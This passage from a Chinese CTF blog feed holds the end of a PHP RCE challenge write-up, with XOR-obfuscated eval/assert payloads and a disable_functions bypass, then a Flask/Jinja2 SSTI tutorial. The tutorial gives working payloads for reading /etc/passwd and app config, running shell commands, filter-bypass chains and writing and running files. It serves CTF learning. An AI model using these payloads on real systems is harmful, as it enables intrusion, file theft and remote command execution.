参数：</p><pre><code>http://site.com/bypass_disablefunc.php?cmd=pwd&amp;outpath=/tmp/xx&amp;sopath=/var/www/bypass_disablefunc_x64.so</code></pre><p>由于在本题中对code有字符数量的限制，所以需要修改我们的payload为异或：</p><p><img src="/2021/10/18/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-RCE-ME-0X01-0X0F/image-20211019230656350.png" alt="image-20211019230656350"></p><pre><code>?code=$&#123;%fe%fe%fe%fe^%a1%b9%bb%aa&#125;[_]($&#123;%fe%fe%fe%fe^%a1%b9%bb%aa&#125;[__]);&amp;_=assert&amp;__=include(%27/var/tmp/shell.php%27)&amp;cmd=/readflag&amp;outpath=/tmp/tmpfile&amp;sopath=/var/tmp/bypass_disablefunc_x64.so</code></pre><pre><code>?code=$&#123;_GET&#125;[_]($&#123;_GET&#125;[_]);&amp;_=assert&amp;_=eval($_POST[&#39;a&#39;])</code></pre><pre><code>http://543c3847-4a06-4587-b8a5-7be27d7b7d7d.node4.buuoj.cn:81/?code=$&#123;%fe%fe%fe%fe^%a1%b9%bb%aa&#125;[_]($&#123;%fe%fe%fe%fe^%a1%b9%bb%aa&#125;[__]);&amp;_=assert&amp;__=include(%27/var/tmp/bypass_disablefunc.php%27)&amp;cmd=/readflag&amp;outpath=/tmp/xx&amp;sopath=/var/tmp/bypass_disablefunc_x64.so</code></pre><p><img src="/2021/10/18/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-RCE-ME-0X01-0X0F/image-20211019225739892.png" alt="image-20211019225739892"></p><p>看网上的大多数是第一种解法，感觉大家都太浮躁，我也不例外。不能为了刷题而刷题。掌握知识点和方法，才能在遇到相似题目时能够及时写出来。</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> 刷题 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> rec </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ssti-flak框架</title>
      <link href="/2021/10/15/ssti-flak%E6%A1%86%E6%9E%B6/"/>
      <url>/2021/10/15/ssti-flak%E6%A1%86%E6%9E%B6/</url>
      
        <content type="html"><![CDATA[<h1 id="初始ssti漏洞"><a href="#初始ssti漏洞" class="headerlink" title="初始ssti漏洞"></a>初始ssti漏洞</h1><blockquote><p>SSTI(Server-Side Template Injection) 服务端模板注入，就是服务器模板中拼接了恶意用户输入导致各种漏洞。通过模板，Web应用可以把输入转换成特定的HTML文件或者email格式</p></blockquote><p><strong>SSTI</strong>，<strong>服务器端模板注入</strong>(Server-Side Template Injection)</p><ul><li>服务端接收攻击者的输入，将其作为Web应用模板内容的一部分</li><li>在进行目标编译渲染的过程中，进行了语句的拼接，执行了所插入的恶意内容</li><li>从而导致信息泄露、代码执行、GetShell等问题</li><li>其影响范围主要取决于模版引擎的复杂性</li><li><strong>注意</strong>：模板引擎 和 渲染函数 本身是没有漏洞的 , 该漏洞的产生原因在于程序员对代码的不严禁与不规范 , 导致了模板可控 , 从而引发代码注入</li></ul><p>ssti漏洞其实有很多种，因为不同的框架语法不同，所以呢，我们注入的时候还要判断是什么框架</p><p>主要的模板语言（我们经常使用的是flask）</p><ul><li>Python：flask、 mako、 tornado、 django</li><li>php：smarty、 twig</li><li>java：jade、 velocity</li></ul><p>这次我们介绍的常用的flask框架，常用的语言为jinjia2。</p><h2 id="路由"><a href="#路由" class="headerlink" title="路由"></a>路由</h2><p>先看一段代码</p><pre><code>from flask import flask @app.route(&#39;/index/&#39;)def hello_word():    return &#39;hello word&#39;</code></pre><p><code>route</code>装饰器的作用是将函数与url绑定起来。例子中的代码的作用就是当你访问<code>http://127.0.0.1：5000/index</code>的时候，flask会返回hello word。</p><h2 id="渲染方法"><a href="#渲染方法" class="headerlink" title="渲染方法"></a>渲染方法</h2><p>flask的渲染方法有render_template和render_template_string两种。</p><p>render_template()是用来渲染一个指定的文件的。使用如下</p><pre><code>return render_template(&#39;index.html&#39;)</code></pre><p>render_template_string则是用来渲染一个字符串的。SSTI与这个方法密不可分。</p><p>使用方法如下</p><pre><code>html = &#39;&lt;h1&gt;This is index page&lt;/h1&gt;&#39;return render_template_string(html)</code></pre><h2 id="模板"><a href="#模板" class="headerlink" title="模板"></a>模板</h2><p>flask是使用Jinja2来作为渲染引擎的。看例子</p><p>在网站的根目录下新建<code>templates</code>文件夹，这里是用来存放html文件。也就是模板文件。</p><p>test.py</p><pre><code>from flask import Flask,url_for,redirect,render_template,render_template_string@app.route(&#39;/index/&#39;)def user_login():    return render_template(&#39;index.html&#39;)</code></pre><p>/templates/index.html</p><pre><code>&lt;h1&gt;This is index page&lt;/h1&gt;</code></pre><p>访问<code>127.0.0.1:5000/index/</code>的时候，flask就会渲染出index.html的页面。</p><p>模板文件并不是单纯的html代码，而是夹杂着模板的语法，因为页面不可能都是一个样子的，有一些地方是会变化的。比如说显示用户名的地方，这个时候就需要使用模板支持的语法，来传参。</p><p>例子</p><p>test.py</p><pre><code>from flask import Flask,url_for,redirect,render_template,render_template_string@app.route(&#39;/index/&#39;)def user_login():    return render_template(&#39;index.html&#39;,content=&#39;This is index page.&#39;)</code></pre><p>/templates/index.html</p><pre><code>&lt;h1&gt;&#123;&#123;content&#125;&#125;&lt;/h1&gt;</code></pre><p>这个时候页面仍然输出<code>This is index page</code>。</p><p>不正确的使用flask中的<code>render_template_string</code>方法会引发SSTI。那么是什么不正确的代码呢？</p><h2 id="xss利用"><a href="#xss利用" class="headerlink" title="xss利用"></a>xss利用</h2><p>存在漏洞的代码</p><pre><code class="python">@app.route(&#39;/test/&#39;)def test():    code = request.args.get(&#39;id&#39;)    html = &#39;&#39;&#39;        &lt;h3&gt;%s&lt;/h3&gt;    &#39;&#39;&#39;%(code)    return render_template_string(html)</code></pre><p>这段代码存在漏洞的原因是数据和代码的混淆。代码中的<code>code</code>是用户可控的，会和html拼接后直接带入渲染。</p><p>尝试构造code为一串js代码。</p><p><img src="/2021/10/15/ssti-flak%E6%A1%86%E6%9E%B6/1540787703_5bd68df77bdf5.png!small" alt="1.png"></p><p>将代码改为如下</p><pre><code class="python">@app.route(&#39;/test/&#39;)def test():    code = request.args.get(&#39;id&#39;)    return render_template_string(&#39;&lt;h1&gt;&#123;&#123; code &#125;&#125;&lt;/h1&gt;&#39;,code=code)</code></pre><p>继续尝试</p><p><img src="/2021/10/15/ssti-flak%E6%A1%86%E6%9E%B6/1540787852_5bd68e8c570a5.png!small" alt="2.png"></p><p>可以看到，js代码被原样输出了。这是因为模板引擎一般都默认对渲染的变量值进行编码转义，这样就不会存在xss了。在这段代码中用户所控的是code变量，而不是模板内容。存在漏洞的代码中，模板内容直接受用户控制的。</p><p>模板注入并不局限于xss，它还可以进行其他攻击。</p><h1 id="SSTI文件读取-命令执行"><a href="#SSTI文件读取-命令执行" class="headerlink" title="SSTI文件读取/命令执行"></a>SSTI文件读取/命令执行</h1><h2 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h2><p>在Jinja2模板引擎中，<code>&#123;&#123;&#125;&#125;`是变量包裹标识符。`&#123;&#123;&#125;&#125;</code>并不仅仅可以传递变量，还可以执行一些简单的表达式。</p><p>这里还是用上文中存在漏洞的代码</p><pre><code class="python">@app.route(&#39;/test/&#39;)def test():    code = request.args.get(&#39;id&#39;)    html = &#39;&#39;&#39;        &lt;h3&gt;%s&lt;/h3&gt;    &#39;&#39;&#39;%(code)    return render_template_string(html)</code></pre><p>构造参数<code>&#123;&#123;2*4&#125;&#125;</code>，结果如下</p><p><img src="/2021/10/15/ssti-flak%E6%A1%86%E6%9E%B6/1540787878_5bd68ea683cce.png!small" alt="3.png">可以看到表达式被执行了。</p><p>在flask中也有一些全局变量。<img src="/2021/10/15/ssti-flak%E6%A1%86%E6%9E%B6/1540787904_5bd68ec05001a.png!small" alt="4.png"></p><h2 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h2><p>看了师傅们的文章，是通过python的对象的继承来一步步实现文件读取和命令执行的的。顺着师傅们的思路，再理一遍。</p><p>找到父类<code>&lt;type &#39;object&#39;&gt;</code>–&gt;寻找子类–&gt;找关于命令执行或者文件操作的模块。</p><p>几个魔术方法</p><pre><code class="python">__class__  返回类型所属的对象__mro__    返回一个包含对象所继承的基类元组，方法在解析时按照元组的顺序解析。__base__   返回该对象所继承的基类// __base__和__mro__都是用来寻找基类的__subclasses__   每个新类都保留了子类的引用，这个方法返回一个类中仍然可用的的引用的列表__init__  类的初始化方法__globals__  对包含函数全局变量的字典的引用</code></pre><p>1 、获取字符串的类对象</p><pre><code>&gt;&gt;&gt; &#39;&#39;.__class__&lt;type &#39;str&#39;&gt;</code></pre><p>2 、寻找基类</p><pre><code>&gt;&gt;&gt; &#39;&#39;.__class__.__mro__(&lt;type &#39;str&#39;&gt;, &lt;type &#39;basestring&#39;&gt;, &lt;type &#39;object&#39;&gt;)</code></pre><p>3 、寻找可用引用</p><pre><code>&gt;&gt;&gt; &#39;&#39;.__class__.__mro__[2].__subclasses__()[&lt;type &#39;type&#39;&gt;, &lt;type &#39;weakref&#39;&gt;, &lt;type &#39;weakcallableproxy&#39;&gt;, &lt;type &#39;weakproxy&#39;&gt;, &lt;type &#39;int&#39;&gt;, &lt;type &#39;basestring&#39;&gt;, &lt;type &#39;bytearray&#39;&gt;, &lt;type &#39;list&#39;&gt;, &lt;type &#39;NoneType&#39;&gt;, &lt;type &#39;NotImplementedType&#39;&gt;, &lt;type &#39;traceback&#39;&gt;, &lt;type &#39;super&#39;&gt;, &lt;type &#39;xrange&#39;&gt;, &lt;type &#39;dict&#39;&gt;, &lt;type &#39;set&#39;&gt;, &lt;type &#39;slice&#39;&gt;, &lt;type &#39;staticmethod&#39;&gt;, &lt;type &#39;complex&#39;&gt;, &lt;type &#39;float&#39;&gt;, &lt;type &#39;buffer&#39;&gt;, &lt;type &#39;long&#39;&gt;, &lt;type &#39;frozenset&#39;&gt;, &lt;type &#39;property&#39;&gt;, &lt;type &#39;memoryview&#39;&gt;, &lt;type &#39;tuple&#39;&gt;, &lt;type &#39;enumerate&#39;&gt;, &lt;type &#39;reversed&#39;&gt;, &lt;type &#39;code&#39;&gt;, &lt;type &#39;frame&#39;&gt;, &lt;type &#39;builtin_function_or_method&#39;&gt;, &lt;type &#39;instancemethod&#39;&gt;, &lt;type &#39;function&#39;&gt;, &lt;type &#39;classobj&#39;&gt;, &lt;type &#39;dictproxy&#39;&gt;, &lt;type &#39;generator&#39;&gt;, &lt;type &#39;getset_descriptor&#39;&gt;, &lt;type &#39;wrapper_descriptor&#39;&gt;, &lt;type &#39;instance&#39;&gt;, &lt;type &#39;ellipsis&#39;&gt;, &lt;type &#39;member_descriptor&#39;&gt;, &lt;type &#39;file&#39;&gt;, &lt;type &#39;PyCapsule&#39;&gt;, &lt;type &#39;cell&#39;&gt;, &lt;type &#39;callable-iterator&#39;&gt;, &lt;type &#39;iterator&#39;&gt;, &lt;type &#39;sys.long_info&#39;&gt;, &lt;type &#39;sys.float_info&#39;&gt;, &lt;type &#39;EncodingMap&#39;&gt;, &lt;type &#39;fieldnameiterator&#39;&gt;, &lt;type &#39;formatteriterator&#39;&gt;, &lt;type &#39;sys.version_info&#39;&gt;, &lt;type &#39;sys.flags&#39;&gt;, &lt;type &#39;exceptions.BaseException&#39;&gt;, &lt;type &#39;module&#39;&gt;, &lt;type &#39;imp.NullImporter&#39;&gt;, &lt;type &#39;zipimport.zipimporter&#39;&gt;, &lt;type &#39;posix.stat_result&#39;&gt;, &lt;type &#39;posix.statvfs_result&#39;&gt;, &lt;class &#39;warnings.WarningMessage&#39;&gt;, &lt;class &#39;warnings.catch_warnings&#39;&gt;, &lt;class &#39;_weakrefset._IterationGuard&#39;&gt;, &lt;class &#39;_weakrefset.WeakSet&#39;&gt;, &lt;class &#39;_abcoll.Hashable&#39;&gt;, &lt;type &#39;classmethod&#39;&gt;, &lt;class &#39;_abcoll.Iterable&#39;&gt;, &lt;class &#39;_abcoll.Sized&#39;&gt;, &lt;class &#39;_abcoll.Container&#39;&gt;, &lt;class &#39;_abcoll.Callable&#39;&gt;, &lt;type &#39;dict_keys&#39;&gt;, &lt;type &#39;dict_items&#39;&gt;, &lt;type &#39;dict_values&#39;&gt;, &lt;class &#39;site._Printer&#39;&gt;, &lt;class &#39;site._Helper&#39;&gt;, &lt;type &#39;_sre.SRE_Pattern&#39;&gt;, &lt;type &#39;_sre.SRE_Match&#39;&gt;, &lt;type &#39;_sre.SRE_Scanner&#39;&gt;, &lt;class &#39;site.Quitter&#39;&gt;, &lt;class &#39;codecs.IncrementalEncoder&#39;&gt;, &lt;class &#39;codecs.IncrementalDecoder&#39;&gt;]可以看到有一个`&lt;type &#39;file&#39;&gt;`</code></pre><p>4 、利用之</p><pre><code>&#39;&#39;.__class__.__mro__[2].__subclasses__()[40](&#39;/etc/passwd&#39;).read()</code></pre><p>放到模板里<img src="/2021/10/15/ssti-flak%E6%A1%86%E6%9E%B6/1540787928_5bd68ed820299.png!small" alt="5.png"></p><p>可以看到读取到了文件。</p><h2 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h2><p>继续看命令执行payload的构造，思路和构造文件读取的一样。</p><p>寻找包含os模块的脚本</p><pre><code>#!/usr/bin/env python# encoding: utf-8for item in &#39;&#39;.__class__.__mro__[2].__subclasses__():    try:         if &#39;os&#39; in item.__init__.__globals__:             print num,item         num+=1    except:        print &#39;-&#39;        num+=1</code></pre><p>输出</p><pre><code>-71 &lt;class &#39;site._Printer&#39;&gt;----76 &lt;class &#39;site.Quitter&#39;&gt;</code></pre><p>payload</p><pre><code class="python">&#39;&#39;.__class__.__mro__[2].__subclasses__()[71].__init__.__globals__[&#39;os&#39;].system(&#39;ls&#39;)</code></pre><p>一般利用点还有 warnings.catch_warnings（一般在59）这个子类，虽然它没有os模块，但warnings.catch_warnings类在在内部定义了_module=sys.modules[‘warnings’]，然后warnings模块包含有__builtins__，也就是说如果可以找到warnings.catch_warnings类，则可以不使用globals，payload如下</p><pre><code>&#123;&#123;''.__class__.__mro__[1].__subclasses__()[40]()._module.__builtins__['__import__']("os").popen('whoami').read()&#125;&#125;</code></pre><p>总而言之，原理都是先找到含有__builtins__的类，然后再进一步利用</p><ul><li>subprocess.Popen进行RCE</li></ul><p>我们可以用find2.py寻找subprocess.Popen这个类，可以直接RCE，payload如下</p><pre><code>&#123;&#123;''.__class__.__mro__[2].__subclasses__()[258]('whoami',shell=True,stdout=-1).communicate()[0].strip()&#125;&#125;</code></pre><ul><li>直接利用os</li></ul><p>一开始我以为这种方法只能用于python2，因为我在本地实验的时候python3中无法找到直接含有os的类，但后来发现python3其实也是能够用的，主要是环境里面有这个那个类才行</p><p>我们把上面的find.py脚本中的search变量赋值为os，去寻找含有os的类</p><pre><code>λ python find.py(&lt;class &#39;site._Printer&#39;&gt;, 69)(&lt;class &#39;site.Quitter&#39;&gt;, 74)</code></pre><p>后面如法炮制，payload如下</p><pre><code>&#123;&#123;().__class__.__base__.__subclasses__()[69].__init__.__globals__['os'].popen('whoami').read()&#125;&#125;</code></pre><p>构造paylaod的思路和构造文件读取的是一样的。只不过命令执行的结果无法直接看到，需要利用curl将结果发送到自己的vps或者利用ceye</p><p>一些利用脚本：</p><p>find.py</p><p><img src="/2021/10/15/ssti-flak%E6%A1%86%E6%9E%B6/f5452aaf65534a159b2328f9b8152b07.jpeg" alt="img"></p><p>我们运行这个脚本</p><pre><code>λ python3 find.py&lt;class &#39;os._wrap_close&#39;&gt; 128</code></pre><p>可以发现object基类的第128个子类名为os._wrap_close的这个类有popen方法</p><p>先调用它的__init__方法进行初始化类</p><pre><code>Python 3.7.8&gt;&gt;&gt; &quot;&quot;.__class__.__bases__[0].__subclasses__()[128].__init__&lt;function _wrap_close.__init__ at 0x000001FCD0B21E58&gt;</code></pre><p>再调用__globals__可以获取到方法内以字典的形式返回的方法、属性等值</p><pre><code>Python 3.7.8&gt;&gt;&gt; &quot;&quot;.__class__.__bases__[0].__subclasses__()[128].__init__.__globals__&#123;&#39;__name__&#39;: &#39;os&#39;...中间省略...&lt;class &#39;os.PathLike&#39;&gt;&#125;</code></pre><p>然后就可以调用其中的popen来执行命令</p><pre><code>Python 3.7.8&gt;&gt;&gt; &quot;&quot;.__class__.__bases__[0].__subclasses__()[128].__init__.__globals__[&#39;popen&#39;](&#39;whoami&#39;).read()&#39;desktop-t6u2ptl\\think\n&#39;</code></pre><p>但是上面的方法仅限于在本地寻找，因为在做CTF题目的时候，我们无法在题目环境中运行这个find.py，这里用hhhm师傅的一个脚本直接去寻找子类</p><p>我们首先把所有的子类列举出来</p><pre><code>Python 3.7.8&gt;&gt;&gt; ().__class__.__bases__[0].__subclasses__()...一大堆的子类</code></pre><p>然后把子类列表放进下面脚本中的a中，然后寻找os._wrap_close这个类</p><p>find2.py</p><pre><code class="python">import jsona = &quot;&quot;&quot;&lt;class &#39;type&#39;&gt;,...,&lt;class &#39;subprocess.Popen&#39;&gt;&quot;&quot;&quot;num = 0allList = []result = &quot;&quot;for i in a:    if i == &quot;&gt;&quot;:        result += i        allList.append(result)        result = &quot;&quot;    elif i == &quot;\n&quot; or i == &quot;,&quot;:        continue    else:        result += i        for k,v in enumerate(allList):    if &quot;os._wrap_close&quot; in v:        print(str(k)+&quot;---&gt;&quot;+v)</code></pre><p><img src="/2021/10/15/ssti-flak%E6%A1%86%E6%9E%B6/552cd597f7d84fcc9d284fdfe0fba5d4.jpeg" alt="img"></p><p>我们首先把所有的子类列举出来</p><pre><code>Python 3.7.8&gt;&gt;&gt; ().__class__.__bases__[0].__subclasses__()...一大堆的子类</code></pre><p>然后把子类列表放进下面脚本中的a中，然后寻找os._wrap_close这个类</p><p>find2.py</p><pre><code class="python">import jsona = &quot;&quot;&quot;&lt;class &#39;type&#39;&gt;,...,&lt;class &#39;subprocess.Popen&#39;&gt;&quot;&quot;&quot;num = 0allList = []result = &quot;&quot;for i in a:    if i == &quot;&gt;&quot;:        result += i        allList.append(result)        result = &quot;&quot;    elif i == &quot;\n&quot; or i == &quot;,&quot;:        continue    else:        result += i        for k,v in enumerate(allList):    if &quot;os._wrap_close&quot; in v:        print(str(k)+&quot;---&gt;&quot;+v)</code></pre><p><img src="https://p6-tt-ipv6.byteimg.com/origin/pgc-image/552cd597f7d84fcc9d284fdfe0fba5d4" alt="img"></p><p>又或者用如下的requests脚本去跑</p><p>find3.py</p><p><img src="/2021/10/15/ssti-flak%E6%A1%86%E6%9E%B6/4512851a74e64923982ffcf8b91e38b9.jpeg" alt="img"></p><p><img src="/2021/10/15/ssti-flak%E6%A1%86%E6%9E%B6/9c63cdfd510c443a8294cfb5091773d6.jpeg" alt="img"></p><h1 id="利用过程（读取config）"><a href="#利用过程（读取config）" class="headerlink" title="利用过程（读取config）"></a>利用过程（读取config）</h1><p>一般来说，读取config我们直接就，就能读取config配置文件，但是为了增加难度，肯定会过滤掉config，让我们读取config配置文件</p><p>这时就需要通过python自带函数调用____globals____变量集合,然后调用其中的current_app全局变量的config</p><h2 id="flask有4个全局变量"><a href="#flask有4个全局变量" class="headerlink" title="flask有4个全局变量"></a>flask有4个全局变量</h2><pre><code>current_app代表当前flask程序实例g作为flask程序全局的临时变量requests客户端发送的HTTP请求内容session用户会话</code></pre><h2 id="python自带函数"><a href="#python自带函数" class="headerlink" title="python自带函数"></a>python自带函数</h2><h3 id="config"><a href="#config" class="headerlink" title="config"></a>config</h3><p>你可以从模板中直接访问Flask当前的config对象:</p><pre><code>&#123;&#123;config.SQLALCHEMY_DATABASE_URI&#125;&#125;sqlite:///database.db</code></pre><h3 id="request"><a href="#request" class="headerlink" title="request"></a>request</h3><p>就是flask中代表当前请求的request对象：</p><pre><code>&#123;&#123;request.url&#125;&#125;http://127.0.0.1</code></pre><h3 id="session"><a href="#session" class="headerlink" title="session"></a>session</h3><p>为Flask的session对象</p><pre><code>&#123;&#123;session.new&#125;&#125;True</code></pre><h3 id="url-for"><a href="#url-for" class="headerlink" title="url_for()"></a>url_for()</h3><p>url_for会根据传入的路由器函数名,返回该路由对应的URL,在模板中始终使用url_for()就可以安全的修改路由绑定的URL,则不比担心模板中渲染出错的链接:</p><pre><code>&#123;&#123;url_for('home')&#125;&#125;/</code></pre><p>如果我们定义的路由URL是带有参数的,则可以把它们作为关键字参数传入url_for(),Flask会把他们填充进最终生成的URL中:</p><pre><code>&#123;&#123; url_for('post', post_id=1)&#125;&#125;/post/1</code></pre><h3 id="get-flashed-messages"><a href="#get-flashed-messages" class="headerlink" title="get_flashed_messages()"></a>get_flashed_messages()</h3><p>这个函数会返回之前在flask中通过flask()传入的消息的列表，flash函数的作用很简单,可以把由Python字符串表示的消息加入一个消息队列中，再使用get_flashed_message()函数取出它们并消费掉：</p><pre><code>&#123;%for message in get_flashed_messages()%&#125;    &#123;&#123;message&#125;&#125;&#123;%endfor%&#125;</code></pre><p>大致playload</p><pre><code>&#123;&#123;url_for('__globals__')['current_app']['config']&#125;&#125;</code></pre><p>下面我列一些pos</p><pre><code>&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__=='catch_warnings' %&#125;&#123;&#123; c.__init__.__globals__['__builtins__'].open('app.py','r').read()&#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</code></pre><pre><code class="python">读目录、文件&#123;&#123;[].__class__.__base__.__subclasses__()[59].__init__.__globals__['__builtins__']['eval']("__import__('os').popen('ls').read()")&#125;&#125;&#123;&#123;[].__class__.__base__.__subclasses__()[59].__init__.__globals__['__builtins__']['eval']("__import__('os').listdir('/')")&#125;&#125;&#123;&#123;[].__class__.__bases__[0].__subclasses__()[71].__init__.__globals__['os'].__dict__['system']('ls')&#125;&#125;&#123;&#123;[].__class__.__bases__[0].__subclasses__()[71].__init__.__globals__['os'].popen(cat /xxx/flag)&#125;&#125;&#123;&#123;[].__class__.__bases__[0].__subclasses__()[59].__init__.__globals__.__builtins__.open('xxx','r').read()&#125;&#125;页面没有回显时#命令执行： &#123;% for c in [].__class__.__base__.__subclasses__() %&#125; #先通过for循环根据模块名寻找符合要求的模块&#123;% if c.__name__=='catch_warnings' %&#125;&#123;&#123; c.__init__.__globals__['__builtins__'].eval("__import__('os').popen('id').read()") &#125;&#125;#如果找到该模块就进行后续的函数操作&#123;% endif %&#125;&#123;% endfor %&#125;   # 结束判断结束循环#文件操作    &#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__=='catch_warnings' %&#125;&#123;&#123; c.__init__.__globals__['__builtins__'].open('filename', 'r').read() &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</code></pre><h1 id="绕过方法"><a href="#绕过方法" class="headerlink" title="绕过方法"></a>绕过方法</h1><p>对一些过滤的绕过方法</p><h2 id="过滤了小括号"><a href="#过滤了小括号" class="headerlink" title="过滤了小括号"></a>过滤了小括号</h2><p>用python的内置函数</p><ul><li>get_flashed_messages()</li><li>url_for()</li></ul><p>payload</p><pre><code class="python">&#123;&#123;url_for.__globals__&#125;&#125;&#123;&#123;url_for.__globals__['current_app'].config['FLAG']&#125;&#125;&#123;&#123;get_flashed_messages.__globals__['current_app'].config['FLAG']&#125;&#125;1234</code></pre><h2 id="过滤了-class、-subclasses、-read等关键词"><a href="#过滤了-class、-subclasses、-read等关键词" class="headerlink" title="过滤了 class、 subclasses、 read等关键词"></a>过滤了 <code>class</code>、 <code>subclasses</code>、 <code>read</code>等关键词</h2><p>用request</p><ul><li>GET: request.args</li><li>Cookies: request.cookies</li><li>Headers: request.headers</li><li>Environment: request.environ</li><li>Values: request.values</li></ul><p>一些用法</p><ul><li><code>request.__class__</code></li><li><code>request[&quot;__class__&quot;]</code></li><li><code>request|attr(&quot;__class__&quot;)</code></li></ul><p>payload</p><pre><code class="python">&#123;&#123;''[request.args.a][request.args.b][2][request.args.c]()&#125;&#125;?a=__class__&amp;b=__mro__&amp;c=__subclasses__1</code></pre><h2 id="过滤了下划线"><a href="#过滤了下划线" class="headerlink" title="过滤了下划线_"></a>过滤了下划线<code>_</code></h2><p>payload</p><pre><code class="python">&#123;&#123;request|attr([request.args.usc*2,request.args.class,request.args.usc*2]|join)&#125;&#125;&amp;class=class&amp;usc=_</code></pre><p>其实现过程如下</p><pre><code class="python">&#123;&#123;request|attr([request.args.usc*2,request.args.class,request.args.usc*2]|join)&#125;&#125;&#123;&#123;request|attr(["_"*2,"class","_"*2]|join)&#125;&#125;&#123;&#123;request|attr(["__","class","__"]|join)&#125;&#125;&#123;&#123;request|attr("__class__")&#125;&#125;&#123;&#123;request.__class__&#125;&#125;</code></pre><h2 id="过滤了中括号-和"><a href="#过滤了中括号-和" class="headerlink" title="过滤了中括号[和]"></a>过滤了中括号<code>[</code>和<code>]</code></h2><p>payload</p><pre><code class="python">&#123;&#123;request|attr((request.args.usc*2,request.args.class,request.args.usc*2)|join)&#125;&#125;&amp;class=class&amp;usc=_&#123;&#123;request|attr(request.args.getlist(request.args.l)|join)&#125;&#125;&amp;l=a&amp;a=_&amp;a=_&amp;a=class&amp;a=_&amp;a=_12</code></pre><h2 id="过滤了-join"><a href="#过滤了-join" class="headerlink" title="过滤了|join"></a>过滤了<code>|join</code></h2><p>用<code>|format</code>    payload</p><pre><code class="python">&#123;&#123;request|attr(request.args.f|format(request.args.a,request.args.a,request.args.a,request.args.a))&#125;&#125;&amp;f=%s%sclass%s%s&amp;a=_1</code></pre><h2 id="无敌绕过的最终RCE"><a href="#无敌绕过的最终RCE" class="headerlink" title="无敌绕过的最终RCE"></a>无敌绕过的最终RCE</h2><p>绕过<code>[</code>，<code>]</code>检查，但不绕过<code>__</code>检查<br> 使用该<code>set</code>函数来访问必需的<code>object（i）</code>类<br> <code>pop()</code>将检索file对象，然后使用我们的已知参数调用该对象<br> 与初始RCE相似，这将创建一个python文件<code>/tmp/foo.py</code>并执行<code>print 1337</code>有效负载</p><pre><code class="python">&#123;%set%20a,b,c,d,e,f,g,h,i%20=%20request.__class__.__mro__%&#125;&#123;&#123;i.__subclasses__().pop(40)(request.args.file,request.args.write).write(request.args.payload)&#125;&#125;&#123;&#123;config.from_pyfile(request.args.file)&#125;&#125;&amp;file=/tmp/foo.py&amp;write=w&amp;payload=print+1337</code></pre><p>绕过所有的rce</p><pre><code class="python">&#123;%set%20a,b,c,d,e,f,g,h,i%20=%20request|attr((request.args.usc*2,request.args.class,request.args.usc*2)|join)|attr((request.args.usc*2,request.args.mro,request.args.usc*2)|join)%&#125;&#123;&#123;(i|attr((request.args.usc*2,request.args.subc,request.args.usc*2)|join)()).pop(40)(request.args.file,request.args.write).write(request.args.payload)&#125;&#125;&#123;&#123;config.from_pyfile(request.args.file)&#125;&#125;&amp;class=class&amp;mro=mro&amp;subc=subclasses&amp;usc=_&amp;file=/tmp/foo.py&amp;write=w&amp;payload=print+1337</code></pre><h1 id="python2的方法"><a href="#python2的方法" class="headerlink" title="python2的方法"></a>python2的方法</h1><p>因为python3和python2两个版本下有差别，这里把python2单独拿出来说</p><p>tips：python2的string类型不直接从属于属于基类，所以要用两次 <strong>bases</strong>[0]</p><p><img src="/2021/10/15/ssti-flak%E6%A1%86%E6%9E%B6/97cd39ea2aec44709fc68929a10ed2ea.jpeg" alt="img"></p><ul><li><h2 id="file类读写文件"><a href="#file类读写文件" class="headerlink" title="file类读写文件"></a>file类读写文件</h2></li></ul><p>本方法只能适用于python2，因为在python3中file类已经被移除了</p><p><img src="/2021/10/15/ssti-flak%E6%A1%86%E6%9E%B6/a9d24ae5c1bd41359cfba6666b1f6228.png" alt="img"></p><p>可以使用dir查看file对象中的内置方法</p><pre><code>&gt;&gt;&gt; dir(().__class__.__bases__[0].__subclasses__()[40])[&#39;__class__&#39;, &#39;__delattr__&#39;, &#39;__doc__&#39;, &#39;__enter__&#39;, &#39;__exit__&#39;, &#39;__format__&#39;, &#39;__getattribute__&#39;, &#39;__hash__&#39;, &#39;__init__&#39;, &#39;__iter__&#39;, &#39;__new__&#39;, &#39;__reduce__&#39;, &#39;__reduce_ex__&#39;, &#39;__repr__&#39;, &#39;__setattr__&#39;, &#39;__sizeof__&#39;, &#39;__str__&#39;, &#39;__subclasshook__&#39;, &#39;close&#39;, &#39;closed&#39;, &#39;encoding&#39;, &#39;errors&#39;, &#39;fileno&#39;, &#39;flush&#39;, &#39;isatty&#39;, &#39;mode&#39;, &#39;name&#39;, &#39;newlines&#39;, &#39;next&#39;, &#39;read&#39;, &#39;readinto&#39;, &#39;readline&#39;, &#39;readlines&#39;, &#39;seek&#39;, &#39;softspace&#39;, &#39;tell&#39;, &#39;truncate&#39;, &#39;write&#39;, &#39;writelines&#39;, &#39;xreadlines&#39;]</code></pre><p>然后直接调用里面的方法即可，payload如下</p><p>读文件</p><pre><code>&#123;&#123;().__class__.__bases__[0].__subclasses__()[40]('/etc/passwd').read()&#125;&#125;&#123;&#123;().__class__.__bases__[0].__subclasses__()[40]('/etc/passwd').readlines()&#125;&#125;</code></pre><ul><li><h2 id="warnings类中的linecache"><a href="#warnings类中的linecache" class="headerlink" title="warnings类中的linecache"></a>warnings类中的linecache</h2></li></ul><p>本方法只能用于python2，因为在python3中会报错’function object’ has no attribute ‘func_globals’，猜测应该是python3中func_globals被移除了还是啥的，如果不对请师傅们指出</p><p>我们把上面的find.py脚本中的search变量赋值为linecache，去寻找含有linecache的类</p><pre><code>λ python find.py(&lt;class &#39;warnings.WarningMessage&#39;&gt;, 59)(&lt;class &#39;warnings.catch_warnings&#39;&gt;, 60)</code></pre><p>后面如法炮制，payload如下</p><pre><code>&#123;&#123;[].__class__.__base__.__subclasses__()[60].__init__.func_globals['linecache'].os.popen('whoami').read()&#125;&#125;</code></pre><h1 id="python2-amp-3的方法"><a 